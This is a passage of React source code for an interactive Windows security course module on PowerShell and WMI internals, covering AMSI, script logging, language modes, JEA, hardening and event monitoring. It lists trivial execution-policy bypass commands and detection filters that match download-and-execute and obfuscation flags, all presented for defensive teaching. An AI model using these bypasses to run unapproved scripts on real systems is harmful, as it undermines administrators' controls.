              <div style={{ color: item.color, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ TECHNIQUES (with why detection still works)</div>
              {item.techniques.map(([cmd, why], i) => (
                <div key={i} style={{ marginBottom: "8px" }}>
                  <div style={{ color: C.bright, fontSize: "11px", fontFamily: mono, background: "#060810", padding: "4px 8px", borderRadius: "3px", marginBottom: "3px", overflowX: "auto", whiteSpace: "pre" }}>{cmd}</div>
                  <div style={{ color: C.dim, fontSize: "10.5px", paddingLeft: "4px" }}>↳ {why}</div>
                </div>
              ))}
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ DETECTION</div>
              <div style={{ background: "#08120a", border: `1px solid ${C.green}22`, borderRadius: "3px", padding: "8px", marginBottom: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.detect}</div>
              </div>
              <div style={{ color: C.red, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ IOC SIGNATURE</div>
              <div style={{ background: "#120808", border: `1px solid ${C.red}22`, borderRadius: "3px", padding: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.ioc}</div>
              </div>
            </div>
          </div>
        </div>
      ))}
    </div>
  );
};

/* ── Execution Policy Panel ─────────────────────────────────────────────── */
const ExecPolicyPanel = () => (
  <div>
    <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "10px", fontSize: "11px" }}>▸ EXECUTION POLICY — WHAT IT IS AND WHAT IT IS NOT</div>
    <div style={{ background: "#100808", border: `1px solid ${C.red}33`, borderRadius: "4px", padding: "12px", marginBottom: "12px" }}>
      <div style={{ color: C.red, fontWeight: "700", fontSize: "12px", marginBottom: "6px" }}>⚠ CRITICAL MISCONCEPTION</div>
      <div style={{ color: C.dim, fontSize: "11px" }}>Execution Policy is <strong style={{color:C.bright}}>NOT a security control</strong>. It is a <strong style={{color:C.bright}}>user preference feature</strong> to prevent accidental script execution. Any user can bypass it trivially. Never rely on Execution Policy for security.</div>
    </div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ POLICY LEVELS</div>
        {[
          ["Restricted", "Default. No scripts run. Only interactive commands.", C.red],
          ["AllSigned", "Scripts must be signed by trusted publisher.", C.orange],
          ["RemoteSigned", "Local scripts run freely. Downloaded require signature.", C.yellow],
          ["Unrestricted", "All scripts run. Warning for downloaded scripts.", C.dim],
          ["Bypass", "No restrictions whatsoever.", C.red],
        ].map(([name, desc, c]) => (
          <div key={name} style={{ display: "flex", gap: "10px", marginBottom: "6px" }}>
            <span style={{ ...S.badge(c), minWidth: "100px", textAlign: "center" }}>{name}</span>
            <span style={{ color: C.dim, fontSize: "11px" }}>{desc}</span>
          </div>
        ))}
      </div>
      <div>
        <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BYPASS METHODS (all trivial)</div>
        <div style={S.code}>
{`# Scope override (process-level):`}
{`powershell -ExecutionPolicy Bypass -File script.ps1`}
{``}
{`# Pipe from stdin:`}
{`Get-Content script.ps1 | powershell -`}
{``}
{`# Encode and pass:`}
{`powershell -EncodedCommand [base64 of script]`}
{``}
{`# IEX from variable:`}
{`$code = [IO.File]::ReadAllText('script.ps1'); iex $code`}
{``}
{`# Environment variable:`}
{`$env:PSExecutionPolicyPreference='bypass'`}
{``}
{`# TRUE security controls (use these instead):`}
{`# AppLocker script rules`}
{`# WDAC (Windows Defender Application Control)`}
{`# Constrained Language Mode (via AppLocker/WDAC)`}
{`# AMSI + Script Block Logging`}
        </div>
      </div>
    </div>
  </div>
);

/* ── PS/WMI Workflow ────────────────────────────────────────────────────── */
const PSWorkflow = () => {
  const steps = [
    { id:"01", label:"User types command / script loaded", sub:"Console host receives input", color:C.cyan, detail:"Interactive: typed at prompt. Script: loaded from file. Encoded: base64 decoded. Remote: received from WinRM deserialization. All converge at the parser." },
    { id:"02", label:"Lexer tokenises → Parser builds AST", sub:"System.Management.Automation.Language.Parser", color:C.sky, detail:"Lexer breaks code into tokens (keyword, identifier, operator, string). Parser builds Abstract Syntax Tree. ParseError here = syntax error before AMSI. AST available for inspection via PowerShell introspection." },
    { id:"03", label:"AMSI scans the script block content", sub:"amsi.dll → AmsiScanBuffer() → AV provider", color:C.red, detail:"BEFORE compilation — every script block content passed to registered AMSI providers. Windows Defender scans for known malicious patterns. If AMSI_RESULT_DETECTED: execution blocked, error thrown, Event 1116 in Defender log." },
    { id:"04", label:"Script Block Logging fires (Event 4104)", sub:"ETW event written to Microsoft-Windows-PowerShell/Operational", color:C.orange, detail:"EVEN IF AMSI ALLOWS IT — 4104 fires for every unique script block. Captures fully-deobfuscated content (tokens resolved, variables NOT resolved at this point). First occurrence flag to reduce duplicates." },
    { id:"05", label:"Script block compiled to LINQ expression tree", sub:"PowerShell compiler → .NET CLR JIT", color:C.purple, detail:"AST compiled to LINQ expression tree → .NET JIT compiles to IL → native code. ScriptBlock object created with unique ID. CLM enforced here — if in Constrained Language Mode, .NET type access blocked." },
    { id:"06", label:"Pipeline execution begins", sub:"Cmdlet discovery → parameter binding → ProcessRecord()", color:C.green, detail:"Each pipeline element: cmdlet resolved (alias → function → cmdlet). Parameters bound via reflection. BeginProcessing() → ProcessRecord() per input object → EndProcessing(). Module logging fires per cmdlet invocation." },
    { id:"07", label:"Output formatting and display", sub:"Format-Table / Format-List / Out-Default", color:C.teal, detail:"Output objects routed to formatter. Format-Table converts objects to text representation. Out-Default sends to host display. Transcript captures BOTH input commands and formatted output." },
    { id:"08", label:"Module logging writes Event 4103", sub:"ETW: pipeline execution per cmdlet", color:C.yellow, detail:"Event 4103 written per module invocation: CommandName, CommandType, ScriptName, User, HostApplication, CommandPath. ParameterBinding section shows all parameter values — very detailed." },
  ];
  return (
    <div>
      {steps.map((s, i) => (
        <div key={s.id} style={{ display: "flex", gap: "0" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "30px" }}>
            <div style={{ width: "22px", height: "22px", borderRadius: "50%", background: `${s.color}18`, border: `1.5px solid ${s.color}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "9px", color: s.color, fontWeight: "700", flexShrink: 0 }}>{s.id}</div>
            {i < steps.length - 1 && <div style={{ width: "1px", height: "28px", background: `${s.color}33` }} />}
          </div>
          <div style={{ paddingLeft: "10px", paddingBottom: "8px", flex: 1 }}>
            <div style={{ display: "flex", gap: "8px", alignItems: "center", flexWrap: "wrap" }}>
              <span style={{ color: s.color, fontWeight: "700", fontSize: "12px" }}>{s.label}</span>
              <span style={S.badge(s.color)}>{s.sub}</span>
            </div>
            <div style={{ color: C.dim, fontSize: "11px", marginTop: "2px", fontStyle: "italic" }}>{s.detail}</div>
          </div>
        </div>
      ))}
    </div>
  );
};

export default function WindowsStep10() {
  const [archTab, setArchTab] = useState("ps_engine");
  const [intTab,  setIntTab]  = useState("logging");
  const [atkTab,  setAtkTab]  = useState("ps_abuse");
  const [monTab,  setMonTab]  = useState("events");
  const [defTab,  setDefTab]  = useState("config");
  const [cmpTab,  setCmpTab]  = useState("scripting");

  return (
    <div style={S.root}>
      <div style={S.bar}>
        <div style={{ display: "flex", gap: "6px" }}>
          {[C.red, C.yellow, C.green].map((c, i) => <span key={i} style={S.dot(c)} />)}
        </div>
        <span style={{ color: C.purple, fontSize: "11px", fontWeight: "700", letterSpacing: "2px" }}>WIN-INTERNALS//CONSOLE</span>
        <span style={{ color: C.dim, fontSize: "10px", marginLeft: "auto" }}>MODULE 10 · POWERSHELL + WMI ENGINE · NT 10.0</span>
        <span style={S.dot(C.green)} />
      </div>

      <div style={S.wrap}>

        {/* ── 1: Title ── */}
        <div style={{ ...S.panel(C.purple), background: "linear-gradient(135deg, #080a12 55%, #0c0020)" }}>
          <div style={S.pb}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "12px" }}>
              <div>
                <div style={{ color: C.dim, fontSize: "10px", letterSpacing: "3px", marginBottom: "5px" }}>WINDOWS INTERNALS CURRICULUM · STEP 10</div>
                <div style={{ color: C.purple, fontSize: "22px", fontWeight: "800", lineHeight: "1.2" }}>PowerShell & WMI</div>
                <div style={{ color: C.bright, fontSize: "14px", fontWeight: "600", marginTop: "2px" }}>Engine Architecture · AMSI · Logging · Remoting · CLM · JEA · WMI Persistence · Abuse & Defence</div>
                <div style={{ color: C.dim, fontSize: "11.5px", marginTop: "5px" }}>The primary admin automation platform — and the most-abused post-exploitation environment in Windows</div>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "5px", alignItems: "flex-end" }}>
                <Pill c={C.green}>LEVEL: INTERMEDIATE → ADVANCED</Pill>
                <Pill c={C.purple}>DOMAIN: SCRIPTING / AUTOMATION / OFFENSE-DEFENSE</Pill>
                <Pill c={C.indigo}>MODULE 10 / 20+</Pill>
              </div>
            </div>
            <hr style={S.sep} />
            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
              {["SysAdmin","Red Team","Blue Team","SOC Analyst","DFIR","Threat Hunter","Security Engineer","Malware Analyst","Auditor"].map(r => (
                <Tag key={r} c={C.purple}>{r}</Tag>
              ))}
            </div>
          </div>
        </div>

        {/* ── 2: Concept ── */}
        <PB title="CONCEPT EXPLANATION" icon="🧠" color={C.cyan}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BEGINNER VIEW</div>
              <Row c={C.green}><strong style={{color:C.bright}}>PowerShell</strong> is Microsoft's scripting language and shell built on .NET. It's the primary automation tool for Windows administration — everything from user management to server configuration to security responses. Every enterprise runs on PowerShell.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>WMI</strong> (Windows Management Instrumentation) is Windows' management data bus — a database of system information and configuration that any application can query. Want to know all running processes, installed software, or network adapters? WMI has it all.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>AMSI</strong> (Antimalware Scan Interface) is the security checkpoint — every PowerShell script, JScript, VBScript and macro passes through AMSI before execution. AV products register as AMSI providers to inspect content.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>Script Block Logging</strong> records the actual PowerShell code that ran — including deobfuscated content. Even if an attacker obfuscates their script, the log captures what actually executed. This is the forensic foundation for PS investigations.</Row>
            </div>
            <div>
              <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ TECHNICAL INTERNALS</div>
              <Row c={C.purple}>PowerShell runs on the <strong style={{color:C.bright}}>CLR (.NET Common Language Runtime)</strong>. The engine is in <strong style={{color:C.bright}}>System.Management.Automation.dll</strong>. Scripts are parsed into an AST, compiled to LINQ expression trees, then JIT-compiled to native code by the CLR.</Row>
              <Row c={C.purple}>WMI is an <strong style={{color:C.bright}}>ESE database</strong> (OBJECTS.DATA in C:\Windows\System32\wbem\repository) combined with a <strong style={{color:C.bright}}>provider architecture</strong>. Static data (class definitions) in the DB. Dynamic data (process list, network state) via in-process provider DLLs loaded into WmiPrvSE.exe.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>Constrained Language Mode (CLM)</strong> is enforced by the PS engine when AppLocker or WDAC is active. It blocks direct .NET access, Add-Type, COM objects — preventing most PowerShell-based exploitation that relies on P/Invoke or reflection.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>WMI event subscriptions</strong> (EventFilter + EventConsumer + Binding) create persistent triggers stored in the WMI repository. They fire without any process, file, or registry key — making them nearly invisible to traditional persistence scanners.</Row>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid4}>
            {[
              ["AMSI = content gate", "Every script block scanned before execution. Cannot be disabled from user mode reliably. The most important PS security control after logging.", C.red],
              ["Script Block Logging = forensic truth", "Event 4104 captures deobfuscated code. Even if attacker obfuscates source, the compiled script block content is logged. Enable on ALL systems.", C.orange],
              ["CLM = .NET access blocker", "Constrained Language Mode prevents most PS exploitation requiring .NET/COM. Automatically active when AppLocker/WDAC enforced. Zero-cost via policy.", C.purple],
              ["WMI subscriptions = invisible persistence", "No file, no registry run key, no service. Stored in WMI repository only. Sysmon Events 19/20/21 are the ONLY automatic detectors.", C.yellow],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 3: Architecture Diagrams ── */}
        <PB title="ENGINE ARCHITECTURE — POWERSHELL · WMI · AMSI · SECURITY CONTROLS" icon="⚙" color={C.purple} accent={C.purple + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["ps_engine","PS ENGINE"],["wmi","WMI ARCHITECTURE"],["amsi","AMSI DEEP DIVE"],["exec_policy","EXECUTION POLICY"]].map(([t, l]) => (
              <button key={t} style={S.tab(archTab === t, C.purple)} onClick={() => setArchTab(t)}>{l}</button>
            ))}
          </div>
          {archTab === "ps_engine"   && <PSEngineArch />}
          {archTab === "wmi"         && <WMIArch />}
          {archTab === "amsi"        && <AMSIPanel />}
          {archTab === "exec_policy" && <ExecPolicyPanel />}
        </PB>

        {/* ── 4: Workflow ── */}
        <PB title="WORKFLOW — POWERSHELL SCRIPT EXECUTION INTERNAL CHAIN" icon="🔄" color={C.orange}>
          <PSWorkflow />
          <hr style={S.sep} />
          <div style={{ color: C.dim, fontSize: "11px" }}>
            <strong style={{ color: C.orange }}>Key insight:</strong> Steps 3 (AMSI) and 4 (Script Block Logging) fire for <strong style={{color:C.bright}}>every script block</strong> — not just at script startup. If a script dynamically builds and executes code (IEX of downloaded string), that downloaded content is ALSO scanned by AMSI and logged as a new Event 4104. Obfuscation of the outer wrapper doesn't protect the inner payload from AMSI or logging.
          </div>
        </PB>

        {/* ── 5: Commands ── */}
        <PB title="POWERSHELL / WMI — OPERATIONS, AUDIT & SECURITY COMMANDS" icon="⌨" color={C.green}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ POWERSHELL SECURITY CONFIGURATION</div>
              <div style={S.code}>
{`# Enable Script Block Logging (GPO or registry):`}
{`$path = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows"`}
{`        + "\\PowerShell\\ScriptBlockLogging"`}
{`New-Item $path -Force`}
{`Set-ItemProperty $path -Name EnableScriptBlockLogging -Value 1`}
{``}
{`# Enable Module Logging (all modules):`}
{`$path2 = "...\\PowerShell\\ModuleLogging"`}
{`New-Item $path2 -Force`}
{`Set-ItemProperty $path2 -Name EnableModuleLogging -Value 1`}
{`New-Item "$path2\\ModuleNames" -Force`}
{`Set-ItemProperty "$path2\\ModuleNames" -Name "*" -Value "*"`}
{``}
{`# Enable Transcription to central share:`}
{`$path3 = "...\\PowerShell\\Transcription"`}
{`New-Item $path3 -Force`}
{`Set-ItemProperty $path3 -Name EnableTranscripting -Value 1`}
{`Set-ItemProperty $path3 -Name OutputDirectory `}
{`    -Value "\\\\siem01\\pstranscripts$"`}
{``}
{`# Check current language mode:`}
{`$ExecutionContext.SessionState.LanguageMode`}
{`# FullLanguage (default) / ConstrainedLanguage / RestrictedLanguage`}
{``}
{`# Remove PowerShell v2 (removes AMSI-free version):`}
{`Disable-WindowsOptionalFeature -Online `}
{`    -FeatureName MicrosoftWindowsPowerShellV2Root`}
              </div>
            </div>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ WMI AUDIT & PERSISTENCE DETECTION</div>
              <div style={S.code}>
{`# List all WMI event subscriptions (persistence check):`}
{`Get-WMIObject -Namespace root\subscription`}
{`    -Class __EventFilter`}
{``}
{`Get-WMIObject -Namespace root\subscription`}
{`    -Class __EventConsumer`}
{``}
{`Get-WMIObject -Namespace root\subscription`}
{`    -Class __FilterToConsumerBinding`}
{``}
{`# Remove malicious WMI subscription:`}
{`$filter = Get-WMIObject -Namespace root\subscription`}
{`    -Class __EventFilter -Filter "Name='EvilFilter'"`}
{`$filter.Delete()`}
{``}
{`# WMI query performance (live process data):`}
{`Get-WMIObject Win32_Process |`}
{`    Select Name,ProcessId,ParentProcessId,`}
{`    @{N="Owner";E={$_.GetOwner().User}} |`}
{`    Sort ProcessId`}
{``}
{`# Query WMI namespace security:`}
{`Get-WMIObject -Namespace root -Class __SystemSecurity |`}
{`    Invoke-WMIMethod -Name GetSD`}
{``}
{`# Clear WMI repository (if corrupted/compromised):`}
{`winmgmt /resetrepository  ; dangerous - use carefully`}
              </div>
            </div>
          </div>
          <div style={{ marginTop: "12px" }}>
            <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ QUERY POWERSHELL EVENTS & INVESTIGATE</div>
            <div style={S.code}>
{`# Find all Script Block events (4104) — last hour:`}
{`$start = (Get-Date).AddHours(-1)`}
{`Get-WinEvent -FilterHashtable @{`}
{`    LogName='Microsoft-Windows-PowerShell/Operational'`}
{`    Id=4104`}
{`    StartTime=$start`}
{`} | Select TimeCreated,`}
{`    @{N="ScriptBlock";E={$_.Properties[2].Value}} |`}
{`    Where ScriptBlock -match "IEX|DownloadString|WebClient|Invoke-Expression"`}
{``}
{`# Find high-risk PS invocations (Event 4688 + PS cmdline):`}
{`Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |`}
{`  Where {$_.Properties[5].Value -match "powershell" `}
{`    -and $_.Properties[8].Value -match "-enc|-nop|-bypass|IEX|hidden"}`}
{`  | Select TimeCreated,`}
{`      @{N="User";E={$_.Properties[1].Value}},`}
{`      @{N="CmdLine";E={$_.Properties[8].Value}}`}
{``}
{`# WMI subscription forensics from Sysmon:`}
{`Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |`}
{`    Where {$_.Id -in 19,20,21} |`}
{`    Select TimeCreated, Id,`}
{`        @{N="Details";E={$_.Properties[4].Value}}`}
            </div>
          </div>
        </PB>

        {/* ── 6: Internal View ── */}
        <PB title="INTERNAL SYSTEM VIEW — LOGGING · REMOTING · CLM/JEA" icon="🔬" color={C.teal}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["logging","LOGGING ARCHITECTURE"],["remoting","PS REMOTING INTERNALS"],["clm","CLM + JEA INTERNALS"]].map(([t, l]) => (
              <button key={t} style={S.tab(intTab === t, C.teal)} onClick={() => setIntTab(t)}>{l}</button>
            ))}
          </div>
          {intTab === "logging"  && <LoggingArch />}
          {intTab === "remoting" && <PSRemoting />}
          {intTab === "clm"      && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ CLM ENFORCEMENT MECHANISM</div>
                <div style={S.code}>
{`LanguageMode enforcement chain:`}
{``}
{`1. PowerShell engine starts`}
{`2. Checks for AppLocker policy:`}
{`   If AppLocker has script rules configured:`}
{`   → PowerShell sets LanguageMode = ConstrainedLanguage`}
{``}
{`3. Checks WDAC (CI policy):`}
{`   If WDAC allows PS scripts:`}
{`   → CLM based on file trust (signed = FullLanguage)`}
{`   If not trusted: ConstrainedLanguage`}
{``}
{`CLM effect on execution:`}
{`  $x = [System.Net.Sockets.TcpClient]  ← BLOCKED`}
{`  Add-Type -TypeDefinition @"..."@      ← BLOCKED`}
{`  $com = New-Object -ComObject Shell.App ← BLOCKED`}
{`  [Reflection.Assembly]::LoadWithPartialName ← BLOCKED`}
{``}
{`Still works in CLM:`}
{`  Standard cmdlets (Get-Process, etc.)`}
{`  Basic math, string operations`}
{`  Regular variables and loops`}
{`  Calling approved scripts (WDAC trusted)`}
{``}
{`# Verify CLM is active:`}
{`$ExecutionContext.SessionState.LanguageMode`}
{`# Output should be: ConstrainedLanguage`}
                </div>
              </div>
              <div>
                <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ JEA SESSION INTERNALS</div>
                <div style={S.code}>
{`JEA endpoint architecture:`}
{``}
{`1. User connects: Enter-PSSession -ConfigurationName JEA-Role`}
{``}
{`2. WinRM creates wsmprovhost.exe`}
{`   Runs as virtual account (admin on machine,`}
{`   ephemeral, no domain rights)`}
{``}
{`3. PSSessionConfiguration (.pssc) applied:`}
{`   SessionType = RestrictedRemoteServer`}
{`   LanguageMode = ConstrainedLanguage (auto)`}
{``}
{`4. RoleCapabilities (.psrc) loaded:`}
{`   Whitelist of allowed cmdlets`}
{`   Whitelist of allowed parameters`}
{`   Whitelist of allowed functions`}
{``}
{`5. Transcription mandatory for JEA:`}
{`   All commands + output logged`}
{`   Full accountability despite limited scope`}
{``}
{`# What operator sees in JEA session:`}
{`[JEA-Host]: PS > Get-Command`}
{`# Only whitelisted commands visible`}
{``}
{`# Security benefit:`}
{`# Helpdesk can restart web service WITHOUT`}
{`# being a local admin. Principle of least privilege.`}
{`# Compromise of JEA credential ≠ full server access.`}
                </div>
              </div>
            </div>
          )}
        </PB>

        {/* ── 7: Abuse Techniques ── */}
        <PB title="POWERSHELL & WMI ABUSE — TECHNIQUES & DETECTION" icon="⚔" color={C.red} accent={C.red + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["ps_abuse","POWERSHELL ABUSE"],["wmi_abuse","WMI ABUSE"]].map(([t, l]) => (
              <button key={t} style={S.tab(atkTab === t, C.red)} onClick={() => setAtkTab(t)}>{l}</button>
            ))}
          </div>
          <AbusePanel tab={atkTab} />
        </PB>

        {/* ── 8: Defense ── */}
        <PB title="DEFENCE — HARDENING PS & WMI" icon="🛡" color={C.green} accent={C.green + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["config","gpo","wmi_harden"].map(t => (
              <button key={t} style={S.tab(defTab === t, C.green)} onClick={() => setDefTab(t)}>{t.replace("_", " ").toUpperCase()}</button>
            ))}
          </div>

          {defTab === "config" && (
            <div style={S.grid2}>
              {[
                ["Enable all PS logging tiers", "Script Block Logging + Module Logging + Transcription. Three independent logging layers. Even if one fails, others capture activity. Transcription survives event log clearing.", C.green],
                ["Remove PowerShell v2", "Disable-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2Root. PS v2 has no AMSI, no Script Block Logging. Single most common bypass technique.", C.red],
                ["Deploy AppLocker with script rules", "AppLocker script rules restrict which PS scripts can run. Automatically enforces CLM for untrusted scripts. Block All scripts from user-writable paths.", C.teal],
                ["WDAC (stronger than AppLocker)", "WDAC enforces CLM even without AppLocker. Kernel-enforced. Cannot be bypassed by local admin. Policy applied even to PS running as SYSTEM.", C.purple],
                ["Enable Protected Event Logging", "Encrypt 4104 events with SIEM's public key. Attacker clearing event logs cannot reveal script content. Requires PKI infrastructure.", C.cyan],
                ["Deploy JEA for admin remoting", "Replace unrestricted PSSession with role-constrained JEA. Least-privilege remote admin. Mandatory transcription. Compromise ≠ full server access.", C.orange],
                ["Restrict WMI namespace permissions", "Remove WMI access from standard users where not needed. Default allows too much read access. Use Get-WMIObject __SystemSecurity to audit.", C.yellow],
                ["Audit WMI subscriptions regularly", "Monthly: query root\\subscription for EventFilter/Consumer/Binding objects. Baseline known-good (SCCM, Defender). Alert on any unknown subscription.", C.orange],
              ].map(([t, d, c]) => (
                <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
                  <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>✓ {t}</div>
                  <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {defTab === "gpo" && (
            <div style={S.code}>
{`# ── POWERSHELL LOGGING GPO SETTINGS ──`}
{`# Computer Config → Admin Templates → Windows Components`}
{`# → Windows PowerShell`}
{``}
{`Turn on Script Block Logging:`}
{`  → Enabled`}
{`  → Log script block invocation start/stop events: Enabled`}
{``}
{`Turn on Module Logging:`}
{`  → Enabled`}
{`  → Module Names to log: * (all modules)`}
{``}
{`Turn on PowerShell Transcription:`}
{`  → Enabled`}
{`  → Transcript output directory: \\\\siem01\\pstranscripts$`}
{`  → Include invocation headers: Enabled`}
{``}
{`# ── APPLOCKER SCRIPT RULES ──`}
{`# Computer Config → Windows Settings → Security Settings`}
{`# → Application Control Policies → AppLocker → Script Rules`}
{``}
{`# Default rules:`}
{`Allow: %WINDIR%\\* (signed Windows scripts)`}
{`Allow: %PROGRAMFILES%\\* (signed installed software)`}
{`Deny: %USERPROFILE%\\* (user-writable → CLM enforced)`}
{`Deny: %TEMP%\\*`}
{`Deny: %APPDATA%\\*`}
{``}
{`# ── PROTECTED EVENT LOGGING ──`}
{`# Computer Config → Admin Templates → Windows Components`}
{`# → Event Logging → Enable Protected Event Logging`}
{`# → Paste SIEM public certificate (Base64 encoded)`}
{``}
{`# ── VERIFY SETTINGS ARE APPLIED ──`}
{`PS> (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging).EnableScriptBlockLogging`}
{`# Should return: 1`}
{``}
{`PS> $ExecutionContext.SessionState.LanguageMode`}
{`# Should return: ConstrainedLanguage (if AppLocker active)`}
            </div>
          )}

          {defTab === "wmi_harden" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ WMI HARDENING CONTROLS</div>
                {[
                  ["Restrict WMI remote access", "Block WMI remote access (DCOM port 135) from workstations via Windows Firewall. Allow only from management/monitoring servers.", C.green],
                  ["WMI namespace ACL tightening", "Audit and restrict __SystemSecurity namespace permissions. Standard users shouldn't have remote enable on sensitive namespaces.", C.teal],
                  ["Disable WMI for non-admin users", "Remove 'Remote Enable' from WMI DCOM security for regular users. Prevents lateral movement via WMI from low-privilege accounts.", C.cyan],
                  ["Monitor OBJECTS.DATA hash", "Weekly hash of C:\\Windows\\System32\\wbem\\repository\\OBJECTS.DATA. Changes outside maintenance windows = possible WMI persistence.", C.orange],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>✓ {t}</div>
                    <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
                  </div>
                ))}
              </div>
              <div>
                <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ WMI SUBSCRIPTION AUDIT SCRIPT</div>
                <div style={S.code}>
{`# Full WMI persistence audit:`}
{`$ns = "root\subscription"`}
{``}
{`Write-Host "=== EVENT FILTERS ===" -ForegroundColor Cyan`}
{`Get-WMIObject -Namespace $ns -Class __EventFilter |`}
{`    Select Name, Query, EventNameSpace |`}
{`    Format-Table -AutoSize`}
{``}
{`Write-Host "=== EVENT CONSUMERS ===" -ForegroundColor Yellow`}
{`Get-WMIObject -Namespace $ns -Class __EventConsumer |`}
{`    Select Name, CommandLineTemplate,`}
{`    ScriptText, ScriptFileName |`}
{`    Format-Table -AutoSize`}
{``}
{`Write-Host "=== BINDINGS ===" -ForegroundColor Red`}
{`Get-WMIObject -Namespace $ns`}
{`    -Class __FilterToConsumerBinding |`}
{`    Select Filter, Consumer |`}
{`    Format-Table -AutoSize`}
{``}
{`# Known-good baseline (adjust for your environment):`}
{`$knownFilters = @("SCM Event Log Filter", `}
{`    "BVTFilter", "MSFT_WMI_...")  # SCCM/Defender entries`}
{``}
{`# Alert on anything not in baseline:`}
{`Get-WMIObject -Namespace $ns -Class __EventFilter |`}
{`    Where {$_.Name -notin $knownFilters} |`}
{`    ForEach { Write-Warning "UNKNOWN FILTER: $($_.Name)" }`}
                </div>
              </div>
            </div>
          )}
        </PB>

        {/* ── 9: Monitoring ── */}
        <PB title="MONITORING — PS/WMI EVENTS · DETECTION · TOOLS" icon="👁" color={C.yellow}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["events","sysmon","iocs","tools"].map(t => (
              <button key={t} style={S.tab(monTab === t, C.yellow)} onClick={() => setMonTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>

          {monTab === "events" && (
            <div style={S.grid2}>
              {[
                ["4104", "PS/Operational", "Script Block Logging — MOST IMPORTANT. Full script content. Filter for: IEX, DownloadString, Invoke-Expression, New-Object Net.WebClient, base64.", C.red],
                ["4103", "PS/Operational", "Module Logging — cmdlet invocations + parameters. High volume. Filter for: Invoke-Expression, Set-ItemProperty, New-ScheduledTask from suspicious contexts.", C.orange],
                ["4100", "PS/Operational", "PowerShell error record — execution failures. Obfuscated scripts often fail before succeeding. Pattern of rapid 4100 + 4104 = iterative bypass attempt.", C.yellow],
                ["4688", "Security",       "Process created — PowerShell invocation. Command line args: -enc, -nop, -bypass, -hidden, -exec bypass = high-risk flags.", C.red],
                ["400",  "PS/Operational", "PowerShell engine state changed (started). Engine version logged — version 2 = bypass attempt.", C.orange],
                ["800",  "PS/Operational", "Pipeline execution details — less detailed than 4103 but available without module logging enabled.", C.dim],
                ["19",   "Sysmon",         "WmiEventFilter — new WMI event filter created. Any non-baseline filter = CRITICAL alert.", C.red],
                ["20",   "Sysmon",         "WmiEventConsumer — new WMI consumer. CommandLine or Script value = persistence code.", C.red],
                ["21",   "Sysmon",         "WmiEventConsumerToFilter — binding activated. Subscription now live. Correlate with 19+20.", C.red],
              ].map(([id, log, desc, c]) => (
